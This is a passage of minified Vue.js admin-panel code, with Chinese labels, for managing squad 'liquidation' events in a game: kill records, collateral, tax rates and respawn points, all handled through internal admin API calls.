copedSlots:{customRender:"victimUser"}},{title:"击杀时间",key:"occuredTimeStamp",dataIndex:"occuredTimeStamp",width:200,align:"center",scopedSlots:{customRender:"occuredTimeStamp"}},{title:"判定得分队伍",key:"winSquad",dataIndex:"winSquad",width:200,align:"center",scopedSlots:{customRender:"winSquad"}},{title:"操作",key:"controls",dataIndex:"controls",width:120,align:"center",scopedSlots:{customRender:"controls"}}],liquidationKillList:[],liquidationKillListPagination:{pageNum:1,pageSize:10,total:0}}}},watch:{liquidationData:{immediate:!0,handler:function(e){var t=this;this.currentExpandedLiquidationId=e.id,e&&this.$nextTick((function(){t.reloadLiquidationKillList()}))}}},methods:{onChangeLiquidationKillListPagination:function(e){var t=this;this.currentLiquidationKill.liquidationKillListPagination.pageNum=e,this.$nextTick((function(){t.reloadLiquidationKillList()}))},onShowSizeChangeLiquidationKillListPagination:function(e,t){var i=this;this.currentLiquidationKill.liquidationKillListPagination.pageNum=1,this.currentLiquidationKill.liquidationKillListPagination.pageSize=t,this.$nextTick((function(){i.reloadLiquidationKillList()}))},reloadLiquidationKillList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentLiquidationKill,"loading",!0),t.prev=1,i=e.currentLiquidationKill.liquidationKillListPagination,a=i.pageNum,n=i.pageSize,r={liquidationId:e.liquidationData.id,pageNum:a,pageSize:n},t.next=6,f({method:"GET",url:"/liquidationAdminSys/listLiquidationKill",params:r});case 6:o=t.sent,e.$set(e.currentLiquidationKill,"loading",!1),200===o.status&&(e.currentLiquidationKill.liquidationKillListPagination.total=o.data.count,e.currentLiquidationKill.liquidationKillList=o.data.list),t.next=16;break;case 11:t.prev=11,t.t0=t.catch(1),console.error(t.t0),e.$message.error(t.t0.toString()),e.$set(e.currentLiquidationKill,"loading",!1);case 16:case"end":return t.stop()}}),t,null,[[1,11]])})))()},deleteLiquidationKill:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,a={id:e.id},i.next=4,f({method:"DELETE",url:"/liquidationAdminSys/deleteLiquidationKill",params:a});case 4:200===i.sent.status&&(t.$message.success("删除成功"),t.reloadLiquidationKillList()),i.next=12;break;case 8:i.prev=8,i.t0=i.catch(0),console.error(i.t0),t.$message.error(i.t0.toString());case 12:case"end":return i.stop()}}),i,null,[[0,8]])})))()}}},ha={name:"Liquidation",components:{LiquidationTableExpand:Object(S.a)(ga,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("a-collapse",{model:{value:e.currentExpandKey,callback:function(t){e.currentExpandKey=t},expression:"currentExpandKey"}},[i("a-collapse-panel",{key:"declare-squad-dollars"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("发起队伍的抵押记录")])]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"declare-squad-dollars"===e}))?i("div",{staticStyle:{width:"100%",height:"400px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"800px"},attrs:{columns:e.currentLiquidationSqaud.columns,"data-source":e.liquidationData.dollarConfigs.declare,"row-key":"id",pagination:!1,bordered:"",scroll:{y:360},size:"small"},scopedSlots:e._u([{key:"userId",fn:function(t,a){return[a.userId?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{id:a.userId}})}}},[e._v(e._s(a.userId))])]:e._e()]}},{key:"dollar",fn:function(t){return[i("span",[e._v(e._s(t)+"美金")])]}},{key:"status",fn:function(t){return[e.liquidationDollarStatusBadgeKeyValue[!0===t?"success":"failed"]?i("a-badge",{attrs:{status:e.liquidationDollarStatusBadgeKeyValue[!0===t?"success":"failed"]}}):e._e(),i("span",[e._v(e._s(e.liquidationDollarStatusEnum[!0===t?"success":"failed"]))])]}}],null,!1,2580588065)})],1)]):e._e()],2),i("a-collapse-panel",{key:"accept-squad-dollars"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("被清算队伍的抵押记录")])]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"accept-squad-dollars"===e}))?i("div",{staticStyle:{width:"100%",height:"400px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"800px"},attrs:{columns:e.currentLiquidationSqaud.columns,"data-source":e.liquidationData.dollarConfigs.accept,"row-key":"id",pagination:!1,bordered:"",scroll:{y:360},size:"small"},scopedSlots:e._u([{key:"userId",fn:function(t,a){return[a.userId?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{id:a.userId}})}}},[e._v(e._s(a.userId))])]:e._e()]}},{key:"dollar",fn:function(t){return[i("span",[e._v(e._s(t)+"美金")])]}},{key:"status",fn:function(t){return[e.liquidationDollarStatusBadgeKeyValue[!0===t?"success":"failed"]?i("a-badge",{attrs:{status:e.liquidationDollarStatusBadgeKeyValue[!0===t?"success":"failed"]}}):e._e(),i("span",[e._v(e._s(e.liquidationDollarStatusEnum[!0===t?"success":"failed"]))])]}}],null,!1,2580588065)})],1)]):e._e()],2),i("a-collapse-panel",{key:"liquidation-kill-record"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("相关击杀记录")])]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"liquidation-kill-record"===e}))?i("div",{staticStyle:{width:"100%",height:"410px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"950px"},attrs:{columns:e.currentLiquidationKill.columns,"data-source":e.currentLiquidationKill.liquidationKillList,"row-key":"id",pagination:!1,loading:e.currentLiquidationKill.loading,bordered:"",scroll:{y:500},size:"small"},scopedSlots:e._u([{key:"killUser",fn:function(t,a){return[a.killUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.killUser.userName}})}}},[e._v(e._s(a.killUser?a.killUser.userName:a.killUserId))])]:e._e()]}},{key:"victimUser",fn:function(t,a){return[a.victimUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.victimUser.userName}})}}},[e._v(e._s(a.victimUser?a.victimUser.userName:a.victimUserId))])]:e._e()]}},{key:"winSquad",fn:function(t,a){return[a.winSquad?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/squad",query:{name:a.winSquad.name}})}}},[e._v(e._s(a.winSquad?a.winSquad.name:a.winSquadId))])]:e._e()]}},{key:"occuredTimeStamp",fn:function(t){return[i("span",[e._v(e._s(e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss")))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该击杀记录吗"},on:{confirm:function(){return e.deleteLiquidationKill(a)}}},[i("a-button",{attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除")])],1)]}}],null,!1,2056823968)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentLiquidationKill.liquidationKillListPagination.pageSize,current:e.currentLiquidationKill.liquidationKillListPagination.pageNum,total:e.currentLiquidationKill.liquidationKillListPagination.total},on:{change:e.onChangeLiquidationKillListPagination,showSizeChange:e.onShowSizeChangeLiquidationKillListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentLiquidationKill.loading}})],1):e._e()],2)],1)}),[],!1,null,"a900fc36",null).exports},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){var e=this;return{moment:R.a,liquidationStatusEnum:{pending:"未开始",processing:"进行中",finished:"已结束",cancelled:"已取消"},liquidationStatusBadgeKeyValue:{pending:"default",processing:"processing",finished:"success",cancelled:"error"},loadingLiquidationListTable:!1,liquidationListFilter:{declareSquadName:void 0,acceptSquadName:void 0,status:void 0,startTimeStamp:void 0,endTimeStamp:void 0},liquidationSettings:{},liquidationListColumns:[{title:"ID",key:"id",dataIndex:"id",width:200,align:"center",scopedSlots:{customRender:"id"}},{title:"发起队伍",key:"declareSquadName",dataIndex:"declareSquadName",width:180,align:"center",scopedSlots:{customRender:"declareSquadName"}},{title:"被清算队伍",key:"acceptSquadName",dataIndex:"acceptSquadName",width:180,align:"center",scopedSlots:{customRender:"acceptSquadName"}},{title:"进行状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],liquidationListData:[],liquidationListPagination:{pageSize:20,pageNum:1,total:0},expandedLiquidationIds:[],addLiquidationModal:!1,addLiquidationLoading:!1,addLiquidationForm:{declareSquadId:void 0,acceptSquadId:void 0,startTimeStamp:null,endTimeStamp:null,dollarConfigs:{dollarPercent:70,settleType:"equality",taxPercent:10,birthLocationPrice:100,enableDeclareSquadBirthLocation:!0,declareSquadBirthLocation:null,enableAcceptSquadBirthLocation:!0,acceptSquadBirthLocation:null}},addLiquidationFormRules:{declareSquadId:[{required:!0,trigger:"change",message:"发起队伍为空",validator:function(e,t,i){t>=0?i():i(new Error("发起队伍为空"))}}],acceptSquadId:[{required:!0,trigger:"change",message:"被清算队伍为空",validator:function(e,t,i){t>=0?i():i(new Error("被清算队伍为空"))}}],startTimeStamp:[{required:!0,trigger:"change",message:"开始时间至少应是十分钟后",validator:function(e,t,i){var a,n=Date.now(),r=null===(a=R()(t))||void 0===a?void 0:a.valueOf();"number"==typeof r&&r-n>6e5?i():i(new Error("开始时间至少应是十分钟后"))}}],endTimeStamp:[{required:!0,trigger:"change",message:"开始时间不能大于等于结束时间",validator:function(t,i,a){var n,r,o=null===(n=R()(i))||void 0===n?void 0:n.valueOf();"number"==typeof o&&(null===(r=R()(e.addLiquidationForm.startTimeStamp))||void 0===r?void 0:r.valueOf())<o?a():a(new Error("开始时间不能大于等于结束时间"))}}],"dollarConfigs.dollarPercent":[{required:!0,trigger:"change",message:"抵押美金比例不合法(30-100)",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100?i():i(new Error("抵押美金比例不合法(30-100)"))}}],"dollarConfigs.settleType":[{required:!0,trigger:"change",message:"分配规则不合法",validator:function(e,t,i){"contribution"===t||"equality"===t?i():i(new Error("分配规则不合法"))}}],"dollarConfigs.taxPercent":[{required:!0,trigger:"change",message:"税率不合法(0-100)",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100?i():i(new Error("税率不合法(0-100)"))}}],"dollarConfigs.birthLocationPrice":[{required:!0,trigger:"change",message:"复活点价格不合法",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("复活点价格不合法"))}}],"dollarConfigs.declareSquadBirthLocation":[{required:!0,trigger:"change",message:"复活点不合法(X Y Z)",validator:function(t,i,a){var n,r;!1===e.addLiquidationForm.dollarConfigs.enableDeclareSquadBirthLocation&&null===i||!0===e.addLiquidationForm.dollarConfigs.enableDeclareSquadBirthLocation&&3===(null==i||null===(n=i.split(" "))||void 0===n?void 0:n.length)&&void 0===(null==i||null===(r=i.split(" "))||void 0===r?void 0:r.find((function(e){return isNaN(Number(e))})))?a():a(new Error("复活点不合法(X Y Z)"))}}],"dollarConfigs.acceptSquadBirthLocation":[{required:!0,trigger:"change",message:"复活点不合法(X Y Z)",validator:function(t,i,a){var n,r;!1===e.addLiquidationForm.dollarConfigs.enableAcceptSquadBirthLocation&&null===i||!0===e.addLiquidationForm.dollarConfigs.enableAcceptSquadBirthLocation&&3===(null==i||null===(n=i.split(" "))||void 0===n?void 0:n.length)&&void 0===(null==i||null===(r=i.split(" "))||void 0===r?void 0:r.find((function(e){return isNaN(Number(e))})))?a():a(new Error("复活点不合法(X Y Z)"))}}]},declareSquadList:[],acceptSquadList:[]}},mounted:function(){this.getLiquidationList()},methods:{onLiquidationListCleanFilter:function(){var e=this;this.liquidationListPagination.pageNum=1,this.$nextTick((function(){e.getLiquidationList()}))},onLiquidationListFilter:function(){var e=this;this.liquidationListPagination.pageNum=1,this.$nextTick((function(){e.getLiquidationList()}))},onChangeLiquidationListPagination:function(e){var t=this;this.liquidationListPagination.pageNum=e,this.$nextTick((function(){t.getLiquidationList()}))},onShowSizeChangeLiquidationListPagination:function(e,t){var i=this;this.liquidationListPagination.pageNum=1,this.liquidationListPagination.pageSize=t,this.$nextTick((function(){i.getLiquidationList()}))},getLiquidationList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.liquidationListPagination,n=a.pageNum,r=a.pageSize,e?(t.liquidationListFilter={declareSquadName:void 0,acceptSquadName:void 0,status:void 0,startTimeStamp:void 0,endTimeStamp:void 0},o={pageNum:n,pageSize:r}):(l=Object(A.cloneDeep)(t.liquidationListFilter),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingLiquidationListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/liquidationAdminSys/list",params:o});case 6:c=i.sent,t.loadingLiquidationListTable=!1,200===c.status&&(t.liquidationListPagination.total=c.data.count,t.liquidationListData=c.data.list.map((function(e){return e.dollarConfigs.enableDeclareSquadBirthLocation=null!==e.dollarConfigs.enableDeclareSquadBirthLocation,e.dollarConfigs.enableDeclareSquadBirthLocation=null!==e.dollarConfigs.enableAcceptSquadBirthLocation,Object(s.a)(Object(s.a)({},e),{},{startTimeStampEdit:R()(Number(e.startTimeStamp)),endTimeStampEdit:R()(Number(e.endTimeStamp)),dollarConfigsEdit:Object(A.cloneDeep)(e.dollarConfigs),editSaveLoading:!1,isEdit:!1})}))),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingLiquidationListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},cancelLiquidation:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e,returnDollars:"1"},i.prev=1,i.next=4,f({method:"DELETE",url:"/liquidationAdminSys/cancel",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getLiquidationList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteLiquidation:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/liquidationAdminSys/delete",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getLiquidationList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},settleLiquidation:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"PUT",url:"/liquidationAdminSys/settleLiquidation",data:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getLiquidationList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},newLiquidation:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.addLiquidationModal=!0,e.$set(e,"addLiquidationForm",{declareSquadId:void 0,acceptSquadId:void 0,startTimeStamp:null,endTimeStamp:null,dollarConfigs:{dollarPercent:70,settleType:"equality",taxPercent:10,birthLocationPrice:100,enableDeclareSquadBirthLocation:!0,declareSquadBirthLocation:null,enableAcceptSquadBirthLocation:!0,acceptSquadBirthLocation:null}});case 2:case"end":return t.stop()}}),t)})))()},handleSearchDeclareSquad:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/squadAdminSys/searchSquads",params:i});case 4:200===(a=e.sent).status&&(this.declareSquadList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchAcceptSquad:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/squadAdminSys/searchSquads",params:i});case 4:200===(a=e.sent).status&&(this.acceptSquadList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),submitAddLiquidation:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.addLiquidationForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n,r,o,s,l,c,d;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=18;break}return a=Object(A.cloneDeep)(e.addLiquidationForm),n=a.declareSquadId,r=a.acceptSquadId,o=a.startTimeStamp,s=a.endTimeStamp,(l=a.dollarConfigs).declareSquadBirthLocation=!0===l.enableDeclareSquadBirthLocation?l.declareSquadBirthLocation:null,l.acceptSquadBirthLocation=!0===l.enableAcceptSquadBirthLocation?l.acceptSquadBirthLocation:null,c={declareSquadId:n,acceptSquadId:r,startTimeStamp:R()(o).valueOf()+"",endTimeStamp:R()(s).valueOf()+"",dollarConfigs:l},e.addLiquidationLoading=!0,t.prev=6,t.next=9,f({method:"POST",url:"/liquidationAdminSys/add",data:c});case 9:d=t.sent,e.addLiquidationLoading=!1,200===d.status?(e.$message.success("添加成功"),e.addLiquidationModal=!1,e.addLiquidationForm={declareSquadId:void 0,acceptSquadId:void 0,startTimeStamp:null,endTimeStamp:null,dollarConfigs:{dollarPercent:70,settleType:"equality",taxPercent:10,birthLocationPrice:100,enableDeclareSquadBirthLocation:!0,declareSquadBirthLocation:null,enableAcceptSquadBirthLocation:!0,acceptSquadBirthLocation:null}},e.getLiquidationList()):(console.log("错误",d),e.$message.error(d.msg)),t.next=18;break;case 14:t.prev=14,t.t0=t.catch(6),console.error(t.t0),e.addLiquidationLoading=!1;case 18:case"end":return t.stop()}}),t,null,[[6,14]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},submitSaveLiquidation:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return e.editSaveLoading=!0,e.dollarConfigsEdit.declareSquadBirthLocation=!0===e.dollarConfigsEdit.enableDeclareSquadBirthLocation?e.dollarConfigsEdit.declareSquadBirthLocation:null,e.dollarConfigsEdit.acceptSquadBirthLocation=!0===e.dollarConfigsEdit.enableAcceptSquadBirthLocation?e.dollarConfigsEdit.acceptSquadBirthLocation:null,a={id:e.id,startTimeStamp:R()(e.startTimeStampEdit).valueOf()+"",endTimeStamp:R()(e.endTimeStampEdit).valueOf()+"",dollarConfigs:Object(A.cloneDeep)(e.dollarConfigsEdit)},i.prev=4,i.next=7,f({method:"PUT",url:"/liquidationAdminSys/update",data:a});case 7:n=i.sent,e.editSaveLoading=!1,200===n.status?(t.$message.success("修改成功"),e.isEdit=!1,t.expandedLiquidationIds=[],t.getLiquidationList()):(console.log("错误",n),t.$message.error(n.msg)),i.next=16;break;case 12:i.prev=12,i.t0=i.catch(4),console.error(i.t0),e.editSaveLoading=!1;case 16:case"end":return i.stop()}}),i,null,[[4,12]])})))()},loadInitialTaskExcludeSteamIds:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if(e.taskExcludeSteamIdsEdit&&e.taskExcludeSteamIdsEdit.length){i.next=2;break}return i.abrupt("return");case 2:return a={keywords:e.taskExcludeSteamIdsEdit},i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/searchUserLoginMulti",params:a});case 6:200===(n=i.sent).status?e.taskExcludeSteamIdListEdit=n.data:(console.log("错误",n),t.$message.error(n.msg)),i.next=13;break;case 10:i.prev=10,i.t0=i.catch(3),console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[3,10]])})))()},loadInitialTaskIncludeSteamIds:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if(e.taskIncludeSteamIdsEdit&&e.taskIncludeSteamIdsEdit.length){i.next=2;break}return i.abrupt("return");case 2:return a={keywords:e.taskIncludeSteamIdsEdit},i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/searchUserLoginMulti",params:a});case 6:200===(n=i.sent).status?e.taskIncludeSteamIdListEdit=n.data:(console.log("错误",n),t.$message.error(n.msg)),i.next=13;break;case 10:i.prev=10,i.t0=i.catch(3),console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[3,10]])})))()}}},fa={name:"StoryLines",components:{BountyHunter:ma,Liquidation:Object(S.a)(ha,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"plus"},nativeOn:{click:function(t){return t.stopPropagation(),e.newLiquidation.apply(null,arguments)}}},[e._v("发起大清算")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLiquidationListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLiquidationListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("发起队伍名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.liquidationListFilter.declareSquadName,callback:function(t){e.$set(e.liquidationListFilter,"declareSquadName",t)},expression:"liquidationListFilter.declareSquadName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("接受队伍名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.liquidationListFilter.acceptSquadName,callback:function(t){e.$set(e.liquidationListFilter,"acceptSquadName",t)},expression:"liquidationListFilter.acceptSquadName"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("活动状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.liquidationListFilter.status,callback:function(t){e.$set(e.liquidationListFilter,"status",t)},expression:"liquidationListFilter.status"}},[i("a-select-option",{key:"pending",attrs:{title:"未开始"}},[e._v("未开始")]),i("a-select-option",{key:"processing",attrs:{title:"进行中"}},[e._v("进行中")]),i("a-select-option",{key:"finished",attrs:{title:"已结束"}},[e._v("已结束")]),i("a-select-option",{key:"cancelled",attrs:{title:"已取消"}},[e._v("已取消")])],1),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.liquidationListFilter.startTimeStamp,e.liquidationListFilter.endTimeStamp],allowClear:""},on:{change:function(t){e.$set(e.liquidationListFilter,"startTimeStamp",t[0]),e.$set(e.liquidationListFilter,"endTimeStamp",t[1])}}})],1)])],1),i("a-modal",{attrs:{width:800,title:"新增大清算","mask-closable":!1},model:{value:e.addLiquidationModal,callback:function(t){e.addLiquidationModal=t},expression:"addLiquidationModal"}},[i("template",{slot:"footer"},[i("a-button",{on:{click:function(t){e.addLiquidationModal=!1}}},[e._v("取消")]),i("a-button",{attrs:{type:"primary",loading:e.addLiquidationLoading},on:{click:e.submitAddLiquidation}},[e._v("提交")])],1),e.addLiquidationModal?i("a-form-model",{ref:"addLiquidationForm",attrs:{model:e.addLiquidationForm,rules:e.addLiquidationFormRules,"label-col":{span:6},"wrapper-col":{span:18}}},[i("a-form-model-item",{attrs:{prop:"declareSquadId",label:"发起队伍"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(名称)","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchDeclareSquad},model:{value:e.addLiquidationForm.declareSquadId,callback:function(t){e.$set(e.addLiquidationForm,"declareSquadId",t)},expression:"addLiquidationForm.declareSquadId"}},e._l(e.declareSquadList,(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.name}},[e._v(e._s(t.name))])})),1)],1),i("a-form-model-item",{attrs:{prop:"acceptSquadId",label:"被清算队伍"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(名称)","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchAcceptSquad},model:{value:e.addLiquidationForm.acceptSquadId,callback:function(t){e.$set(e.addLiquidationForm,"acceptSquadId",t)},expression:"addLiquidationForm.acceptSquadId"}},e._l(e.acceptSquadList,(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.name}},[e._v(e._s(t.name))])})),1)],1),i("a-form-model-item",{attrs:{prop:"startTimeStamp",label:"大清算开始时间"}},[i("a-date-picker",{staticStyle:{width:"100%"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:e.addLiquidationForm.startTimeStamp,allowClear:""},on:{change:function(t){e.$set(e.addLiquidationForm,"startTimeStamp",t)}}})],1),i("a-form-model-item",{attrs:{prop:"endTimeStamp",label:"大清算结束时间"}},[i("a-date-picker",{staticStyle:{width:"100%"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:e.addLiquidationForm.endTimeStamp,allowClear:""},on:{change:function(t){e.$set(e.addLiquidationForm,"endTimeStamp",t)}}})],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.dollarPercent",label:"抵押比例"}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:0,max:100},model:{value:e.addLiquidationForm.dollarConfigs.dollarPercent,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"dollarPercent",t)},expression:"addLiquidationForm.dollarConfigs.dollarPercent"}})],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.settleType",label:"奖金分配规则"}},[i("a-radio-group",{attrs:{"button-style":"solid",size:"small"},model:{value:e.addLiquidationForm.dollarConfigs.settleType,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"settleType",t)},expression:"addLiquidationForm.dollarConfigs.settleType"}},[i("a-radio-button",{attrs:{value:"contribution"}},[e._v("按劳分配")]),i("a-radio-button",{attrs:{value:"equality"}},[e._v("平均分配")])],1)],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.taxPercent",label:"奖金税率"}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:0,max:100},model:{value:e.addLiquidationForm.dollarConfigs.taxPercent,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"taxPercent",t)},expression:"addLiquidationForm.dollarConfigs.taxPercent"}})],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.birthLocationPrice",label:"复活点价格"}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:0},model:{value:e.addLiquidationForm.dollarConfigs.birthLocationPrice,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"birthLocationPrice",t)},expression:"addLiquidationForm.dollarConfigs.birthLocationPrice"}})],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.declareSquadBirthLocation",label:"发起队伍复活点"}},[i("a-switch",{model:{value:e.addLiquidationForm.d